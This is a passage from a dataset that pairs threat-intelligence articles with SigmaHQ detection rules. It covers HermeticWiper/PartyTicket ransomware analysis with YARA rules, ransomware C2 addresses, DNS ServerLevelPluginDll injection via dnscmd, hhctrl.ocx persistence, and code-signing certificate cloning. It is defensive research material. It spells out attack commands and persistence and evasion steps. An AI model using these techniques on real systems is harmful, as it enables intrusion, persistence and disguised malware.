*(_unsigned __int8 (__golang **)(uint8_t *))(f_itab + 3))(f_data) )\n          {\n              dirnameb[0] = input;\n              dirnameb[1].str = (uint8_t *)\"\\\\\";\n              dirnameb[1].len = 1LL;\n              dirnameb[2].str = f_n_ptr;\n              dirnameb[2].len = f_n_len;\n              dirnameb = runtime_concatstring3(0LL, *(string *)(*3))&dirname_8[0].str, c_projects_403forBiden_WhiteHouseE_primaryElectionProcess(dirnameb, out);\n          }\n      }\n  }\n  else\n  {\n      dirnamec.str = f_n_ptr;\n      dirnamec.len = f_n_len;\n      out = c_projects_403forBiden_WhiteHouseE_lookUp(dirnamec);\n      if ( substr[0] )\n      {\n      }\n  }\n```\n\n*PartyTicket looping over non-system folders*\n\nThe resulting number of folders will be used as an upperbound for concurrent threads, a mistake by the Go devs as that effectively ties up all of the system’s resources. While the files found are all queued into a channel for the threads to reference.\n\n```image\nAlt: PartyTicket generating concurrent threads\nDescription: The image is a code snippet displaying a loop written in a programming language, likely Go. It shows the structure of a for loop where a variable 'j' is initialized and iterated over the length of 'partyTicket_len'. Inside the loop, it adds to a wait group, indicating concurrent process management, and calls a function 'indirect_subscribeNewPartyMember'. This code is relevant to the analysis of the PartyTicket malware, illustrating its execution process related to thread management.\n```\n\n*PartyTicket generating concurrent threads*\n\nThe function indirectly called for each thread is `main.subscribeNewPartyMember()`. It in turn takes a filename, makes a copy with a `<UUID>.exe` name and deletes the original file. Then we expect a second loop to relieve that queue of files and run each through a standard Go AES crypto implementation. However, execution is unlikely to get this far with the current design of PartyTicket.\n\n(Thanks to Joakim Kennedy (Intezer) for pointing out this indirect call)\n\n```image\nAlt: Crypto routine for files queued in the ‘salary’ channel\nDescription: The image shows a snippet of code, likely from the PartyTicket malware, written in a programming language (possibly Go). The code contains several lines that reference variables, a key, and functions indicative of encryption or file handling processes. The use of a key suggests functionality related to cryptography, and the syntax implies a structure typical in programming, with potential indications of how the malware operates or interacts with files. The highlighted text in purple may represent string literals or critical parameters used within the code.\n```\n\n*Crypto routine for files queued in the ‘salary’ channel*\n\nOverall our analysis of PartyTicket indicates it to be a rather simple, poorly coded, and loud malware. Its possible role as a decoy ransomware deployed alongside HermeticWiper is more likely to be effective for its accidental hogging of the victim organization’s system resources rather than the encryption of files itself. IOCs and Yara rules have been added below.\n\n## Conclusion\n\nAfter a week of defacements and increasing DDoS attacks, the proliferation of sabotage operations through wiper malware is an expected and regrettable escalation. At this time, we have a very small sliver of aperture into the attacks in Ukraine and subsequent spillover into neighboring countries and allies. If there’s a silver lining to such a difficult situation, it’s seeing the open collaboration between threat intel research teams, independent researchers, and journalists looking to get the story straight. Our thanks to the researchers at Symantec, ESET, Stairwell, and RedCanary among others who’ve contributed samples, time, and expertise.\n\n## SentinelOne Customers Protected\n\n[🇺🇦 SentinelOne Vs. Hermetic Wiper - A Destructive Malware Used In Cyber Attacks on Ukraine](https://www.youtube.com/watch?v=keWfVA6F4IM)\n\n## Indicators of Compromise\n**(Updated February 28th, 2022)**\n\n| **ms-compressed resources** | **SHA1**                                 |\n| --------------------------- | ---------------------------------------- |\n| RCDATA_DRV_X64              | 5ceebaf1cbb0c10b95f7edd458804a646c6f215e |\n| RCDATA_DRV_X86              | 0231721ef4e4519ec776ff7d1f25c937545ce9f4 |\n| RCDATA_DRV_XP_X64           | 9c2e465e8dfdfc1c0c472e0a34a7614d796294af |\n| RCDATA_DRV_XP_X86           | ee764632adedf6bb4cf4075a20b4f6a79b8f94c0 |\n\n| **HermeticWiper** | **SHA1**                                 |\n| ----------------- | ---------------------------------------- |\n| Win32 EXE         | 0d8cc992f279ec45e8b8dfd05a700ff1f0437f29 |\n| Win32 EXE         | 61b25d11392172e587d8da3045812a66c3385451 |\n| Win32 EXE         | 912342f1c840a42f6b74132f8a7c4ffe7d40fb77 |\n| Win32 EXE         | 9518e4ae0862ae871cf9fb634b50b07c66a2c379 |\n| Win32 EXE         | d9a3596af0463797df4ff25b7999184946e3bfa2 |\n\n| **PartyTicket** | **SHA-1**                                |\n| --------------- | ---------------------------------------- |\n| Win32 EXE       | f32d791ec9e6385a91b45942c230f52aff1626df |\n\n## YARA Rules\n\n(YARA Rules on GitHub)\n\n```\nimport \"pe\"\n\nrule MAL_HERMETIC_WIPER {\n    meta:\n      desc = \"Hermetic Wiper - broad hunting rule\"\n      author = \"Hegel @ SentinelLabs\"\n      version = \"1.0\"\n      last_modified = \"02.23.2022\"\n      hash = \"1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591\"\n      reference = \"https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\"\n    strings:\n        $string1 = \"DRV_XP_X64\" wide ascii nocase\n        $string2 = \"EPMNTDRV\\\\%u\" wide ascii nocase\n        $string3 = \"PhysicalDrive%u\" wide ascii nocase\n        $cert1 = \"Hermetica Digital Ltd\" wide ascii nocase\n    condition:\n      uint16(0) == 0x5A4D and\n      all of them\n}\n\nrule MAL_PARTY_TICKET {\n    meta:\n      desc = \"PartyTicket / HermeticRansom Golang Ransomware - associated with HermeticWiper campaign\"\n      author = \"Hegel @ SentinelLabs\"\n      version = \"1.0\"\n      last_modified = \"02.24.2022\"\n      hash = \"4dc13bb83a16d4ff9865a51b3e4d24112327c526c1392e14d56f20d6f4eaf382\"\n      reference = \"https://twitter.com/juanandres_gs/status/1496930731351805953\"\n    strings:\n        $string1 = \"/403forBiden/\" wide ascii nocase\n        $string2 = \"/wHiteHousE/\" wide ascii\n        $string3 = \"vote_result.\" wide ascii\n        $string4 = \"partyTicket.\" wide ascii\n        $buildid1 = \"Go build ID: \\\"qb0H7AdWAYDzfMA1J80B/nJ9FF8fupJl4qnE4WvA5/PWkwEJfKUrRbYN59_Jba/2o0VIyvqINFbLsDsFyL2\\\"\" wide ascii\n        $project1 = \"C:/projects/403forBiden/wHiteHousE/\" wide ascii\n    condition:\n      uint16(0) == 0x5A4D and\n      (2 of ($string*) or\n        any of ($buildid*) or\n        any of ($project*)\n      )\n}\n\nrule MAL_COMPROMISED_HERMETICA_CERT  {\n    meta:\n      desc = \"Hermetica Cert - broad hunting rule based on the certificate used in HermeticWiper and HermeticWizard\"\n      author = \"Hegel @ SentinelLabs\"\n      version = \"1.0\"\n      last_modified = \"03.01.2022\"\n      hash = \"1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591\"\n      reference = \"https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\"\n    condition:\n      uint16(0) == 0x5a4d and\n      for any i in (0 .. pe.number_of_signatures) : (\n         pe.signatures[i].issuer contains \"DigiCert EV Code Signing CA\" and\n         pe.signatures[i].serial == \"0c:48:73:28:73:ac:8c:ce:ba:f8:f0:e1:e8:32:9c:ec\"\n      )\n}\n\nrule MAL_ISSAC_WIPER {\n    meta:\n      desc = \"Issac Wiper - broad hunting rule\"\n      author = \"Hegel @ SentinelLabs\"\n      version = \"1.0\"\n      last_modified = \"03.01.2022\"\n      hash = \"13037b749aa4b1eda538fda26d6ac41c8f7b1d02d83f47b0d187dd645154e033\"\n      reference = \"https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/\"\n    strings:\n        $name1 = \"Cleaner.dll\" wide ascii\n        $name2 = \"cl.exe\" wide ascii nocase\n        $name3 = \"cl64.dll\" wide ascii nocase\n        $name4 = \"cld.dll\" wide ascii nocase\n        $name5 = \"cll.dll\" wide ascii nocase\n        $name6 = \"Cleaner.exe\" wide ascii\n        $export = \"_Start@4\" wide ascii\n    condition:\n      uint16(0) == 0x5A4D and\n      (any of ($name*) and $export)\n}\n\nrule MAL_HERMETIC_WIZARD {\n    meta:\n      desc = \"HermeticWizard hunting rule\"\n      author = \"Hegel @ SentinelLabs\"\n      version = \"1.0\"\n      last_modified = \"03.01.2022\"\n      reference = \"https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/\"\n    strings:\n        $name1 = \"Wizard.dll\" wide ascii\n        $name2 = \"romance.dll\" wide ascii\n        $name3 = \"exec_32.dll\" wide ascii\n        $function1 = \"DNSGetCacheDataTable\" wide ascii\n        $function2 = \"GetIpNetTable\" wide ascii\n        $function3 = \"WNetOpenEnumW\" wide ascii\n        $function4 = \"NetServerEnum\" wide ascii\n        $function5 = \"GetTcpTable\" wide ascii\n        $function6 = \"GetAdaptersAddresses\" wide ascii\n        $function7 = \"GetEnvironmentStrings\" wide ascii\n        $ip_anchor1 = \"192.168.255.255\" wide ascii\n    condition:\n      uint16(0) == 0x5A4D and\n      (any of ($function*) and any of ($name*) and $ip_anchor1)\n}\n```\n\n## SentinelOne STAR Rules\n\n```\nEventType = \"Process Creation\" AND TgtProcPublisher = \"HERMETICA DIGITAL LTD\"  AND\n( SrcProcSignedStatus = \"signed\" AND IndicatorPersistenceCount = \"2\"  AND RegistryValue = \"4\" AND RegistryKeyPath = \"MACHINE\\SYSTEM\\ControlSet001\\Services\\VSS\\Start\" ) AND SrcProcImagePath !~ \"devsetup64.exe\"\n```",
    "sigma_rule": {
      "title": "CrashControl CrashDump Disabled",
      "id": "2ff692c2-4594-41ec-8fcb-46587de769e0",
      "status": "test",
      "description": "Detects disabling the CrashDump per registry (as used by HermeticWiper)",
      "references": [
        "https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/"
      ],
      "author": "Tobias Michalski (Nextron Systems)",
      "date": "2022-02-24",
      "modified": "2023-08-17",
      "tags": [
        "attack.t1564",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "SYSTEM\\CurrentControlSet\\Control\\CrashControl",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate disabling of crashdumps"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_crashdump_disabled.yml",
    "id": "938"
  },
  {
    "url": "https://twitter.com/MichalKoczwara/status/1553634816016498688",
    "markdown": "# Post\n\nJul 31, 2022\n\nRansomware Group and C2 seems to be still active\n\nA few new files added\n\n- 95.213.145.99\n- 95.213.145.101\n\n```image\nDescription: The image displays a directory listing for a server, showcasing various files available for download. The list includes executable files (e.g., 'artifact.exe', 'main.exe') and batch files (e.g., 'LOGOFALL.bat', 'shadowGuru.bat'). Some files are highlighted, indicating their potential relevance or importance in the context of cyber threats. The server IP address shown is '95.213.145.101', and it's accessed via port '8000', suggesting ongoing activity related to a ransomware group.\nTranscription: |\n  Directory listing for /\n  - artifact.exe\n  - dropper_cs.exe\n  - LOGOFALL.bat\n  - logofall1.bat\n  - main.exe\n  - MIMIMI.7z\n  - MIMIMI.zip\n  - PoshC2.bat\n  - shadowGuru.bat\n  - winrar-x64-611.exe\n  - z.bat\n```\n\n```image\nDescription: The image displays a web page showing a directory listing for the IP address 95.213.145.99 on port 8000. The page lists several files, including 'ANY_DESK.bat', 'def1.bat', 'defender+malwar.bat', 'NG.bat', 'ngrok.exe', and 'VmManagedSetup.exe'. The 'NG.bat' file is highlighted, indicating it may be of particular interest or relevance.\nTranscription: |\n  Directory listing for /\n  \n  - ANY_DESK.bat\n  - def1.bat\n  - defender+malwar.bat\n  - NG.bat\n  - ngrok.exe\n  - VmManagedSetup.exe\n```",
    "sigma_rule": {
      "title": "Potential AutoLogger Sessions Tampering",
      "id": "f37b4bce-49d0-4087-9f5b-58bffda77316",
      "status": "test",
      "description": "Detects tampering with autologger trace sessions which is a technique used by attackers to disable logging",
      "references": [
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
        "https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-01",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "TargetObject|contains": "\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\EventLog-",
            "\\Defender"
          ],
          "TargetObject|endswith": [
            "\\Enable",
            "\\Start"
          ],
          "Details": "DWORD (0x00000000)"
        },
        "filter_wevtutil": {
          "Image": "C:\\Windows\\system32\\wevtutil.exe"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_autologger_sessions.yml",
    "id": "942"
  },
  {
    "url": "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html",
    "markdown": "# Hunting DNS Server Level Plugin dll injection\n\n09 May 2017\n\nThis post is accompanying my addition to the ThreatHunter-Playbook to enhance the IOC I added there with some details to detect the DNS server level plugin dll injection, published this week. I am not going to make a detailed description for that attack, as there are already plenty of great resources:\n\n- Feature, not bug: DNSAdmin to DC compromise in one line.\n- Abusing DNSAdmins privilege for escalation in Active Directory\n\nIf you want to play with this DNS server feature just use one of the following DNS Server ready-to-use DNS server level plugin dlls:\n\n- VCC project on my GitHub\n- mimilib is also ready\n\nWe assume the attacker has a privileged user to reconfigure the DNS service:\n\nThe attack has to be executed in two steps:\n\n1.\n   ```\n   dnscmd.exe dc1.lab.internal /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll\n   ```\n   - Whereas the dll has to be as a special DNS server plugin dll. (my GitHub)\n   - A registry parameter gets added: `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll` and set to the value `\\\\192.168.0.149\\dll\\wtf.dll`\n\n2. The DNS service gets restarted\n   - The DLL is loaded into `dns.exe` and the API functions are called.\n\n## Additional DLLs loaded\n\nIf a DNS server plugin gets added to the DNS there are two dlls loaded additionally to the default ones and the specified plugin dll, which may be required especially when the plugin dll is located on a network share.\n\n- `C:\\Windows\\System32\\icmp.dll`\n- `C:\\Windows\\System32\\oleaut32.dll`\n- `\\\\192.168.0.149\\dll\\wtf.dll` (the specified plugin dll)\n\nYou can download the raw data of the intersection (2 at the last column means loaded in both cases plugin / no plugin) here.\n\n## events triggered: executing dnscmd\n\n-\n   ```\n   dnscmd dc1 /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll\n   ```\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n    <EventID>13</EventID>\n    <Version>2</Version>\n    <Level>4</Level>\n    <Task>13</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000000000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:52:35.589834200Z\"/>\n    <EventRecordID>8435</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"1264\" ThreadID=\"2980\"/>\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData>\n    <Data Name=\"EventType\">SetValue</Data>\n    <Data Name=\"UtcTime\">2017-05-09 08:52:35.589</Data>\n    <Data Name=\"ProcessGuid\">{85D1CFA0-7DCD-5911-0000-0010F4196600}</Data>\n    <Data Name=\"ProcessId\">3388</Data>\n    <Data Name=\"Image\">C:\\Windows\\system32\\dns.exe</Data>\n    <Data Name=\"TargetObject\">\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\DNS\\Parameters\\ServerLevelPluginDll</Data>\n    <Data Name=\"Details\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n  </EventData>\n</Event>\n```\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNSServer\" Guid=\"{EB79061A-A566-4698-9119-3ED2807060E7}\"/>\n    <EventID>541</EventID>\n    <Version>0</Version>\n    <Level>4</Level>\n    <Task>10</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x4000000008000000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:52:35.589834200Z\"/>\n    <EventRecordID>148</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"3388\" ThreadID=\"3928\"/>\n    <Channel>Microsoft-Windows-DNSServer/Audit</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-21-764058423-2567595003-319586131-1001\"/>\n  </System>\n  <EventData>\n    <Data Name=\"Setting\">serverlevelplugindll</Data>\n    <Data Name=\"Scope\">.</Data>\n    <Data Name=\"NewValue\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n  </EventData>\n</Event>\n```\n\n## events triggered: DNS service Restarted\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNS-Server-Service\" Guid=\"{71A551F5-C893-4849-886B-B5EC8502641E}\"/>\n    <EventID>771</EventID>\n    <Version>0</Version>\n    <Level>4</Level>\n    <Task>0</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000008000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:54:26.798142300Z\"/>\n    <EventRecordID>263</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"2312\" ThreadID=\"3068\"/>\n    <Channel>DNS Server</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData/>\n</Event>\n```\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNS-Server-Service\" Guid=\"{71A551F5-C893-4849-886B-B5EC8502641E}\"/>\n    <EventID>770</EventID>\n    <Version>0</Version>\n    <Level>4</Level>\n    <Task>0</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000008000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:54:26.798142300Z\"/>\n    <EventRecordID>264</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"2312\" ThreadID=\"3068\"/>\n    <Channel>DNS Server</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData>\n    <Data Name=\"DNS_EVENT_PLUGIN_DLL_LOAD_OK\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n    <Data Name=\"param2\">dc1.lab.internal</Data>\n  </EventData>\n</Event>\n```\n\n## events triggered: on error\n\n```\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n  <System>\n    <Provider Name=\"Microsoft-Windows-DNS-Server-Service\" Guid=\"{71A551F5-C893-4849-886B-B5EC8502641E}\"/>\n    <EventID>150</EventID>\n    <Version>0</Version>\n    <Level>2</Level>\n    <Task>0</Task>\n    <Opcode>0</Opcode>\n    <Keywords>0x8000000000008000</Keywords>\n    <TimeCreated SystemTime=\"2017-05-09T08:00:55.264092600Z\"/>\n    <EventRecordID>219</EventRecordID>\n    <Correlation/>\n    <Execution ProcessID=\"3904\" ThreadID=\"2324\"/>\n    <Channel>DNS Server</Channel>\n    <Computer>dc1.lab.internal</Computer>\n    <Security UserID=\"S-1-5-18\"/>\n  </System>\n  <EventData>\n    <Data Name=\"DNS_EVENT_PLUGIN_INIT_FAILED\">\\\\192.168.0.149\\dll\\wtf.dll</Data>\n    <Binary>7F000000</Binary>\n  </EventData>\n</Event>\n```\n\n---\n\nTags:\n- #Threat Hunting\n- #sysmon\n- #DNS\n- #Windows\n- #Microsoft",
    "sigma_rule": {
      "title": "New DNS ServerLevelPluginDll Installed",
      "id": "e61e8a88-59a9-451c-874e-70fcc9740d67",
      "related": [
        {
          "id": "cbe51394-cd93-4473-b555-edf0144952d9",
          "type": "derived"
        },
        {
          "id": "f63b56ee-3f79-4b8a-97fb-5c48007e8573",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the installation of a DNS plugin DLL via ServerLevelPluginDll parameter in registry, which can be used to execute code in context of the DNS server (restart required)",
      "references": [
        "https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83",
        "https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2017-05-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\services\\DNS\\Parameters\\ServerLevelPluginDll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_dns_server_level_plugin_dll.yml",
    "id": "953"
  },
  {
    "url": "https://persistence-info.github.io/Data/hhctrl.html",
    "markdown": "# persistence-info.github.io\n\n## hhctrl.ocx\n\n### Location:\n```\nHKCR\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32\n```\n\n### Classification:\n\n| Criteria         | Value              |\n| ---------------- | ------------------ |\n| Permissions      | Admin              |\n| Security context | User               |\n| Persistence type | Registry           |\n| Code type        | Other[^1]          |\n| Launch type      | User initiated[^2] |\n| Impact           | Destructive[^3]    |\n| OS Version       | All OS versions    |\n| Dependencies     | OS only            |\n| Toolset          | Scriptable         |\n\n### Description:\n> When hh.exe is started it tries to find the hhctrl.ocx library by checking the following Registry value: `HKCR\\CLSID{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32’ The library that the value points to is then loaded. If the library doesn’t exist, or the loading didn’t succeed the hh.exe gives it another go and attempts to load the library using the hard-coded name hhctrl.ocx and relying on the LoadLibrary function (and as a result is a subject to side-loading attacks). As such, there seem to be at least 2 opportunities here:\n1. Drop `c:\\WINDOWS\\hhctrl.ocx` and delete the `HKCR\\CLSID{52A2AAAE…` value so running hh.exe will sideload the `c:\\WINDOWS\\hhctrl.ocx`\n2. Replace the value of the `HKCR\\CLSID{52A2AAAE…` to point to your own lib and run hh.exe – this will load the lib of choice\n\n### References:\nhttps://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/\n\n### See also:\n.chm helper DLL\n\n### Remarks:\n[^1]: .ocx\n[^2]: ‘hh.exe’ must be run. Manually, or via associated .chm file\n[^3]: To be verified",
    "sigma_rule": {
      "title": "Persistence Via Hhctrl.ocx",
      "id": "f10ed525-97fe-4fed-be7c-2feecca941b1",
      "status": "test",
      "description": "Detects when an attacker modifies the registry value of the \"hhctrl\" to point to a custom binary",
      "references": [
        "https://persistence-info.github.io/Data/hhctrl.html",
        "https://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32\\(Default)"
        },
        "filter": {
          "Details": "C:\\Windows\\System32\\hhctrl.ocx"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hhctrl_persistence.yml",
    "id": "960"
  },
  {
    "url": "https://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/",
    "markdown": "# Beyond good ol’ Run key, Part 77\n\nPosted on 2018-04-23\n\nThis is one more about hh.exe program that is used when you open the .chm files.\n\nThe hh.exe functionality is implemented by the hhctrl.ocx library. When hh.exe is started it tries to find the hhctrl.ocx library by checking the following Registry value:\n\n```\nHKCR\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32\n```\n\nThe library that the value points to is then loaded.\n\nIf the library doesn’t exist, or the loading didn’t succeed the hh.exe gives it another go and attempts to load the library using the hard-coded name hhctrl.ocx and relying on the LoadLibrary function (and as a result is a subject to side-loading attacks).\n\nAs such, there seem to be at least 2 opportunities here:\n\n- Drop `c:\\WINDOWS\\hhctrl.ocx` and delete the `HKCR\\CLSID\\{52A2AAAE…` value so running hh.exe will sideload the `c:\\WINDOWS\\hhctrl.ocx`\n- Replace the value of the `HKCR\\CLSID\\{52A2AAAE…` to point to your own lib and run hh.exe – this will load the lib of choice\n\nBoth can be used as a LOLBin / Persistence trick (or a combo).\n\nThis entry was posted in Anti-*, Autostart (Persistence), Living off the land, LOLBins by adam. Bookmark the permalink.",
    "sigma_rule": {
      "title": "Persistence Via Hhctrl.ocx",
      "id": "f10ed525-97fe-4fed-be7c-2feecca941b1",
      "status": "test",
      "description": "Detects when an attacker modifies the registry value of the \"hhctrl\" to point to a custom binary",
      "references": [
        "https://persistence-info.github.io/Data/hhctrl.html",
        "https://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32\\(Default)"
        },
        "filter": {
          "Details": "C:\\Windows\\System32\\hhctrl.ocx"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hhctrl_persistence.yml",
    "id": "961"
  },
  {
    "url": "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec",
    "markdown": "# Code Signing Certificate Cloning Attacks and Defenses\n\nBefore reading this post, ponder the following question: “What does it *actually* mean to you for something to be signed by Microsoft (or any vendor for that matter)?”\n\n## Introduction: SOC Analyst Autoruns Baselining Scenario\n\nImagine you’re working in a SOC and you’re tasked with baselining persistence entries across 40,000 hosts. You’re tasked specifically with inspecting run key persistence. You have Sysinternals deployed across the enterprise, you run Autoruns across every system, and forward the results to a Splunk dashboard that allows you to easily interpret the results. The smart SOC analyst you are knows that signed Microsoft applications can be abused, so you make sure that “Microsoft” and “Windows” entries are not hidden when running autorunsc.exe. You cluster all of the common results together and start focusing on outliers in the data set. You find the following outlier on 6 systems out of 40,000:\n\n```\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n   SecurityAudit\n     C:\\Windows Defender\\MpCmdRun.exe\n     Microsoft Malware Protection Command Line Utility\n     (Verified) Microsoft Corporation\n     4.12.16299.15\n     c:\\windows defender\\mpcmdrun.exe\n     11/25/1912 5:39 AM\n```\n\nYou apply the following process to determine whether the entry is benign or suspicious:\n\n1. You note that the binary is a verified “Microsoft Corporation” binary. Knowing that it is signed by Microsoft allows you to scrutinize it less since this particular signed binary is not known to have been abused by attackers.\n2. You Google MpCmdRun.exe and confirm that it is indeed associated with Windows Defender.\n3. You enabled VirusTotal integration with Autoruns (assuming your organization has accepted that risk) and it comes back with 0 positive AV hits.\n4. You’re still unsure as to why it’s an outlier but your enterprise is a large, heterogenous environment where the concept of a baselined gold image does not exist.\n5. You accept that it’s an outlier but you are confident that MpCmdRun.exe isn’t being abused in the wild and you subsequently filter future hits of this hash. After all, you have many more outliers to wade through.\n\nDoes this scenario sound familiar to anyone? Unfortunately, as much as I hate to say it, that Autoruns entry was positive evidence of compromise and you overlooked it and decided to overlook it in the future as well.\n\n## Certificate Chain Cloning and Cloned Root Trust Attacks\n\nWhat our SOC analyst failed to pick up on was the fact that MpCmdRun.exe was signed using a cloned Microsoft certificate chain where the attacker also trusted their cloned root certificate on the compromised victim systems. How might an attacker go about performing such an attack? The steps can be summarized as follows:\n\n1. Export all certificates in a legitimate certificate chain to disk. These certificates are what you’ll be using as a template for your own cloned certificate chain.\n2. Build a cloned certificate chain using the chain that was exported to disk. The New-SelfSignedCertificate cmdlet in PowerShell has very convenient “-CloneCert” and “-Signer” parameters to enable this. Upon cloning the chain, you will be able to sign malicious code with the cloned certificate chain.\n3. You’ll also want to export the cloned root certificate as you will need to trust this certificate on the victim system in order for any of your signed, malicious code to verify properly and blend in with many security tools.\n\nThe following video shows the manual process of exporting the certificate chain used to sign kernel32.dll:\n\n*Manually exporting a legitimate Microsoft certificate chain to disk to use as a template for cloning.*\n\nNow that the Microsoft certificate chain has been exported to disk, you can now use it as a template for building a spoofed Microsoft certificate chain. The following code was used to achieve this:\n\n*The following video demonstrates running the code above:*\n\nSo why does this attack work? Well, at a high level, digital signature validation relies upon the following:\n\n1. Integrity validation — Does the hash of the file match the signed hash in the signature? If not, the integrity of the file has been compromised and it should not be trusted.\n2. Certificate chain validation — Was each certificate in the chain properly issued by its parent?\n3. Certificate validity check — If each certificate in the chain is not timestamped, is each certificate within its stated validity time frame? If the digital signature is timestamped, validate the timestamping certificate counter-signature chain.\n4. Revocation check — Are any of the certificates in the chain revoked or explicitly untrusted by an administrator?\n5. Root CA validation — Is the root certificate in the signer chain a trusted certificate?\n\nTechnically, our 